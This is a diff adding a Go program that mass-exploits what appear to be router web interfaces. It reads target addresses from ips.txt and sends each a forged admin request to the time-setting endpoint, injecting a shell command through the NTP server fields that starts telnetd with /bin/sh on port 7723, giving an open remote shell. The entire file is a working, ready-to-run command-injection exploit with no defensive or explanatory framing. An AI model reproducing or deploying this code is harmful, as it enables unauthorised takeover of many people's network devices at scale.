@@ -1,0 +1,64 @@
+package main
+
+import (
+    "bufio"
+    "bytes"
+    "fmt"
+    "net/http"
+    "os"
+)
+
+func SendExp(ip string, port string) {
+    url := fmt.Sprintf("http://%s:%s/goform/formJsonAjaxReq", ip, port)
+    payload := []byte(`{"action":"set_timesetting","data":{"ntpserver0":";$(telnetd -p 7723 -l /bin/sh)","ntpserver1":";$(telnetd -p 7723 -l /bin/sh)","timezone":"UTC-8"}}`)
+
+    req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
+    if err != nil {
+        fmt.Println("Error creating request:", err)
+        return
+    }
+
+    req.Header.Set("Content-Type", "application/json")
+    req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
+    req.Header.Set("X-Requested-With", "XMLHttpRequest")
+    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36")
+    req.Header.Set("Origin", fmt.Sprintf("http://%s", ip))
+    req.Header.Set("Referer", fmt.Sprintf("http://%s/home.asp", ip))
+    req.Header.Set("Accept-Encoding", "gzip, deflate")
+    req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+    req.Header.Set("Cookie", "userLanguage=EN; username=admin")
+    req.Header.Set("Connection", "close")
+
+    client := &http.Client{}
+    resp, err := client.Do(req)
+    if err != nil {
+        fmt.Println("Error sending request:", err)
+        return
+    }
+    defer resp.Body.Close()
+
+    fmt.Println("Exploit successfully sent to: ", ip)
+}
+
+func main() {
+    filePath := "ips.txt"
+
+    file, err := os.Open(filePath)
+    if err != nil {
+        fmt.Printf("Error opening file '%s': %v\n", filePath, err)
+        return
+    }
+    defer file.Close()
+
+    scanner := bufio.NewScanner(file)
+    for scanner.Scan() {
+        ip := scanner.Text()
+        port := os.Args[1]
+        SendExp(ip, port)
+    }
+
+    if err := scanner.Err(); err != nil {
+        fmt.Printf("Error reading file '%s': %v\n", filePath, err)
+        return
+    }
+}
